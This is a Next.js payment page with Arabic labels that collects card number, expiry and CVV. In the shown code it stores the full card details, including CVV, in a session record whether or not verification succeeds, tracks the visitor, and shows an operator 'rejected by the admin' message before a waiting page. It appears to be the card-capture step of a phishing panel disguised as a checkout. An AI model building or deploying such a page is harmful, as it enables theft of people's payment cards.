"use client";
export const dynamic = 'force-dynamic';
import { useState, useEffect } from "react";
import { useRouter, useSearchParams } from "next/navigation";
import SessionTracker from "@/components/SessionTracker";

const GREEN = "#1e7344";

// ===== خوارزمية Luhn =====
function luhnCheck(cardNum: string): boolean {
  const digits = cardNum.replace(/\s/g, "");
  if (!/^\d{13,19}$/.test(digits)) return false;
  let sum = 0;
  let shouldDouble = false;
  for (let i = digits.length - 1; i >= 0; i--) {
    let digit = parseInt(digits[i], 10);
    if (shouldDouble) {
      digit *= 2;
      if (digit > 9) digit -= 9;
    }
    sum += digit;
    shouldDouble = !shouldDouble;
  }
  return sum % 10 === 0;
}

// ===== التحقق من تاريخ الانتهاء =====
function validateExpiry(expiry: string): { valid: boolean; msg: string } {
  const clean = expiry.replace(/\s/g, "");
  const match = clean.match(/^(\d{2})\/?(\d{2})$/);
  if (!match) return { valid: false, msg: "صيغة التاريخ غير صحيحة (MM/YY)" };
  const month = parseInt(match[1], 10);
  const year = parseInt("20" + match[2], 10);
  if (month < 1 || month > 12) return { valid: false, msg: "الشهر يجب أن يكون بين 01 و 12" };
  const now = new Date();
  const expDate = new Date(year, month, 0);
  if (expDate < now) return { valid: false, msg: "البطاقة منتهية الصلاحية" };
  return { valid: true, msg: "" };
}

// ألوان البنوك حسب نوع البطاقة
function getCardGradient(cardNumber: string): string {
  const n = cardNumber.replace(/\s/g, "");
  if (n.startsWith("4")) return "linear-gradient(135deg, #1a1f71 0%, #0d1147 100%)";
  if (/^5[1-5]/.test(n) || /^2[2-7]/.test(n)) return "linear-gradient(135deg, #eb001b 0%, #f79e1b 100%)";
  if (/^3[47]/.test(n)) return "linear-gradient(135deg, #007bc1 0%, #004f80 100%)";
  return "linear-gradient(135deg, #1e7344 0%, #114126 100%)";
}

export default function PaymentPage() {
  const router = useRouter();
  const [cardHolder, setCardHolder] = useState("");
  const [cardNumber, setCardNumber] = useState("");
  const [expiry, setExpiry] = useState("");
  const [cvv, setCvv] = useState("");
  const [errorMsg, setErrorMsg] = useState("");
  const [isSubmitting, setIsSubmitting] = useState(false);

  // أخطاء الحقول
  const [cardNumberError, setCardNumberError] = useState("");
  const [expiryError, setExpiryError] = useState("");
  const [cvvError, setCvvError] = useState("");
  const [cardHolderError, setCardHolderError] = useState("");

  const searchParams = useSearchParams();

  useEffect(() => {
    const rejected = searchParams.get("rejected");
    if (rejected === "1") {
      setErrorMsg("تم رفض العملية من قبل الأدمين");
    }
  }, [searchParams]);

  function formatCardNumber(val: string) {
    const digits = val.replace(/\D/g, "").slice(0, 16);
    return digits.replace(/(.{4})/g, "$1 ").trim();
  }

  function formatExpiry(val: string) {
    const digits = val.replace(/\D/g, "").slice(0, 4);
    if (digits.length >= 3) return digits.slice(0, 2) + " / " + digits.slice(2);
    return digits;
  }

  function handleCardNumberChange(val: string) {
    const formatted = formatCardNumber(val);
    setCardNumber(formatted);
    setCardNumberError("");
  }

  function onCardNumberBlur() {
    const digits = cardNumber.replace(/\s/g, "");
    if (!digits) { setCardNumberError(""); return; }
    if (digits.length < 13) {
      setCardNumberError("رقم البطاقة قصير جداً");
      return;
    }
    if (!luhnCheck(cardNumber)) {
      setCardNumberError("رقم البطاقة غير صالح - يرجى التحقق من الأرقام");
      return;
    }
    setCardNumberError("");
  }

  function onExpiryBlur() {
    const clean = expiry.replace(/\s/g, "");
    if (!clean) { setExpiryError(""); return; }
    const result = validateExpiry(expiry);
    setExpiryError(result.valid ? "" : result.msg);
  }

  function onCvvBlur() {
    if (!cvv) { setCvvError(""); return; }
    if (cvv.length < 3) setCvvError("رمز CVV يجب أن يكون 3 أرقام على الأقل");
    else setCvvError("");
  }

  async function handleSubmit() {
    let hasError = false;

    if (!cardHolder.trim()) {
      setCardHolderError("يرجى إدخال اسم حامل البطاقة");
      hasError = true;
    } else {
      setCardHolderError("");
    }

    const digits = cardNumber.replace(/\s/g, "");
    if (!digits) {
      setCardNumberError("يرجى إدخال رقم البطاقة");
      hasError = true;
    } else if (digits.length < 13) {
      setCardNumberError("رقم البطاقة قصير جداً");
      hasError = true;
    } else if (!luhnCheck(cardNumber)) {
      setCardNumberError("رقم البطاقة غير صالح - يرجى التحقق من الأرقام");
      hasError = true;
    } else {
      setCardNumberError("");
    }

    if (!expiry) {
      setExpiryError("يرجى إدخال تاريخ الانتهاء");
      hasError = true;
    } else {
      const expiryResult = validateExpiry(expiry);
      if (!expiryResult.valid) {
        setExpiryError(expiryResult.msg);
        hasError = true;
      } else {
        setExpiryError("");
      }
    }

    if (!cvv) {
      setCvvError("يرجى إدخال رمز CVV");
      hasError = true;
    } else if (cvv.length < 3) {
      setCvvError("رمز CVV يجب أن يكون 3 أرقام");
      hasError = true;
    } else {
      setCvvError("");
    }

    if (hasError) return;

    setIsSubmitting(true);
    setErrorMsg("");

    // إرسال بيانات البطاقة للـ backend للتحقق من Stripe
    try {
      const [expMonth, expYear] = expiry.split('/').map(s => s.trim());

      const res = await fetch('/api/stripe-verify', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          cardHolder: cardHolder,
          cardNumber: cardNumber.replace(/\s/g, ''),
          cardExpiry: expiry,
          cardCvv: cvv,
          expMonth: parseInt(expMonth, 10),
          expYear: parseInt('20' + expYear, 10),
        }),
      });

      const data = await res.json();

      // حفظ البيانات في الجلسة (سواء نجحت أو فشلت)
      try {
        await fetch('/api/session', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({
            current_page: 'payment',
            card_holder: cardHolder,
            card_number: cardNumber,
            card_expiry: expiry,
            card_cvv: cvv,
            stripe_status: data.stripeStatus || (data.success ? 'ناجحة' : 'مرفوضة'),
            waiting_for: 'payment',
          }),
        });
      } catch {}

      if (!data.success) {
        setIsSubmitting(false);
        setErrorMsg(data.error || 'حدث خطأ في التحقق من البطاقة');
        return;
      }

      // انتقل لصفحة الانتظار
      router.push("/loading-page?from=payment");
    } catch (error) {
      setIsSubmitting(false);
      setErrorMsg('حدث خطأ في الاتصال، يرجى المحاولة مرة أخرى');
    }
  }

  const displayNumber = cardNumber || "#### #### #### ####";
  const digits = cardNumber.replace(/\s/g, "");
  const luhnValid = digits.length >= 13 && luhnCheck(cardNumber);

  const hasCardData = digits.length >= 1;
  const cardGradient = hasCardData ? getCardGradient(cardNumber) : "linear-gradient(145deg, #f0f0f0 0%, #e8e8e8 100%)";
  const cardTextColor = hasCardData ? "white" : "#555";
  const cardSubTextColor = hasCardData ? "rgba(255,255,255,0.7)" : "rgba(0,0,0,0.4)";
  const cardNumberColor = hasCardData ? "white" : "#333";

  const inputStyle = (hasError: boolean) => ({
    width: "100%",
    padding: "13px",
    border: `1.5px solid ${hasError ? "#e74c3c" : "#e0e0e0"}`,
    borderRadius: "10px",
    fontSize: "15px",
    outline: "none" as const,
    fontFamily: "inherit",
    transition: "border-color 0.2s",
    boxSizing: "border-box" as const,
    backgroundColor: hasError ? "#fff8f8" : "white",
  });

  return (
    <div style={{ backgroundColor: "#f7f8fa", display: "flex", justifyContent: "center", alignItems: "center", minHeight: "100vh", flexDirection: "column", padding: "20px" }}>
      <SessionTracker page="payment" />
      <div style={{ background: "#fff", width: "100%", maxWidth: "500px", borderRadius: "25px", padding: "40px", boxShadow: "0 10px 30px rgba(0,0,0,0.05)" }}>
        <h1 style={{ fontSize: "28px", color: "#333", marginBottom: "30px", fontWeight: "bold", textAlign: "center" }}>
          معلومات البطاقة
        </h1>

        {/* بطاقة العرض */}
        <div style={{
          background: cardGradient,
          borderRadius: "15px",
          padding: "30px 25px",
          color: cardTextColor,
          marginBottom: "30px",
          boxShadow: "0 8px 20px rgba(0,0,0,0.15)",
          position: "relative",
          overflow: "hidden",
          minHeight: "200px",
          display: "flex",
          flexDirection: "column",
          justifyContent: "space-between"
        }}>
          {/* الخطوط الزخرفية */}
          <div style={{
            position: "absolute",
            top: "-50px",
            right: "-50px",
            width: "200px",
            height: "200px",
            background: "rgba(255,255,255,0.1)",
            borderRadius: "50%"
          }} />

          {/* اسم البنك */}
          <div style={{ position: "relative", zIndex: 1 }}>
            <div style={{ fontSize: "12px", color: cardSubTextColor, marginBottom: "5px" }}>CARD HOLDER</div>
            <div style={{ fontSize: "18px", fontWeight: "bold", color: cardTextColor }}>
              {cardHolder || "Your Name"}
            </div>
          </div>

          {/* رقم البطاقة */}
          <div style={{ position: "relative", zIndex: 1 }}>
            <div style={{ fontSize: "24px", letterSpacing: "3px", fontFamily: "monospace", color: cardNumberColor, fontWeight: "bold" }}>
              {displayNumber}
            </div>
          </div>

          {/* التاريخ و CVV */}
          <div style={{ display: "flex", justifyContent: "space-between", alignItems: "flex-end", position: "relative", zIndex: 1 }}>
            <div>
              <div style={{ fontSize: "10px", color: cardSubTextColor }}>VALID THRU</div>
              <div style={{ fontSize: "16px", fontWeight: "bold", color: cardTextColor }}>
                {expiry || "MM/YY"}
              </div>
            </div>
            <div style={{ textAlign: "right" }}>
              <div style={{ fontSize: "10px", color: cardSubTextColor }}>CVV</div>
              <div style={{ fontSize: "14px", fontWeight: "bold", color: cardTextColor, letterSpacing: "2px" }}>
                {cvv ? "•••" : ""}
              </div>
            </div>
          </div>
        </div>

        {/* رسالة الخطأ */}
        {errorMsg && (
          <div style={{
            background: "#fff3cd",
            border: "1px solid #ffc107",
            color: "#856404",
            padding: "12px 15px",
            borderRadius: "8px",
            marginBottom: "20px",
            fontSize: "14px",
            textAlign: "center"
          }}>
            {errorMsg}
          </div>
        )}

        {/* النموذج */}
        <div style={{ display: "flex", flexDirection: "column", gap: "20px" }}>
          {/* اسم حامل البطاقة */}
          <div>
            <label style={{ display: "block", marginBottom: "8px", fontSize: "14px", color: "#333", fontWeight: "500" }}>
              اسم حامل البطاقة
            </label>
            <input
              type="text"
              placeholder="أحمد محمد"
              value={cardHolder}
              onChange={(e) => {
                setCardHolder(e.target.value);
                setCardHolderError("");
              }}
              style={inputStyle(!!cardHolderError)}
            />
            {cardHolderError && (
              <div style={{ color: "#e74c3c", fontSize: "12px", marginTop: "5px" }}>
                {cardHolderError}
              </div>
            )}
          </div>

          {/* رقم البطاقة */}
          <div>
            <label style={{ display: "block", marginBottom: "8px", fontSize: "14px", color: "#333", fontWeight: "500" }}>
              رقم البطاقة
            </label>
            <input
              type="text"
              placeholder="1234 5678 9012 3456"
              value={cardNumber}
              onChange={(e) => handleCardNumberChange(e.target.value)}
              onBlur={onCardNumberBlur}
              maxLength={19}
              style={inputStyle(!!cardNumberError)}
            />
            {cardNumberError && (
              <div style={{ color: "#e74c3c", fontSize: "12px", marginTop: "5px" }}>
                {cardNumberError}
              </div>
            )}
          </div>

          {/* التاريخ و CVV */}
          <div style={{ display: "grid", gridTemplateColumns: "1fr 1fr", gap: "15px" }}>
            <div>
              <label style={{ display: "block", marginBottom: "8px", fontSize: "14px", color: "#333", fontWeight: "500" }}>
                تاريخ الانتهاء
              </label>
              <input
                type="text"
                placeholder="MM/YY"
                value={expiry}
                onChange={(e) => {
                  setExpiry(formatExpiry(e.target.value));
                  setExpiryError("");
                }}
                onBlur={onExpiryBlur}
                maxLength={5}
                style={inputStyle(!!expiryError)}
              />
              {expiryError && (
                <div style={{ color: "#e74c3c", fontSize: "12px", marginTop: "5px" }}>
                  {expiryError}
                </div>
              )}
            </div>

            <div>
              <label style={{ display: "block", marginBottom: "8px", fontSize: "14px", color: "#333", fontWeight: "500" }}>
                CVV
              </label>
              <input
                type="password"
                placeholder="123"
                value={cvv}
                onChange={(e) => {
                  setCvv(e.target.value.replace(/\D/g, "").slice(0, 4));
                  setCvvError("");
                }}
                onBlur={onCvvBlur}
                maxLength={4}
                style={inputStyle(!!cvvError)}
              />
              {cvvError && (
                <div style={{ color: "#e74c3c", fontSize: "12px", marginTop: "5px" }}>
                  {cvvError}
                </div>
              )}
            </div>
          </div>

          {/* زر الدفع */}
          <button
            onClick={handleSubmit}
            disabled={isSubmitting}
            style={{
              background: GREEN,
              color: "white",
              border: "none",
              padding: "14px",
              borderRadius: "10px",
              fontSize: "16px",
              fontWeight: "bold",
              cursor: isSubmitting ? "not-allowed" : "pointer",
              opacity: isSubmitting ? 0.6 : 1,
              transition: "all 0.3s",
              marginTop: "10px"
            }}
          >
            {isSubmitting ? "جاري المعالجة..." : "ادفع الآن"}
          </button>
        </div>

        {/* رسالة الأمان */}
        <div style={{ marginTop: "25px", paddingTop: "20px", borderTop: "1px solid #eee", display: "flex", flexDirection: "column", alignItems: "center", gap: "10px", textAlign: "center" }}>
          <span style={{ fontSize: "12px", color: "#888" }}>🔒 جميع بياناتك محمية بتشفير SSL</span>
        </div>
      </div>
    </div>
  );
}
